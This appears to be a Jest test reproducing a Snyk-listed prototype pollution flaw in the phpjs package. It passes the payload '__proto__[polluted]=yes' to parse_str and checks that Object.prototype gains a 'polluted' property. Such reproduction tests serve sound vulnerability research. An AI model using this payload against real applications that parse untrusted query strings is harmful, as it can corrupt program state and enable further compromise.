//https://snyk.io/vuln/SNYK-JS-PHPJS-598681

test("prototype pollution in phpjs", () => {
    
    var p = require('phpjs')
    obj = {}

    expect({}.polluted).toBe(undefined);
    
    p.parse_str("__proto__[polluted]=yes",{});
    expect({}.polluted).toBe("yes");
  });
  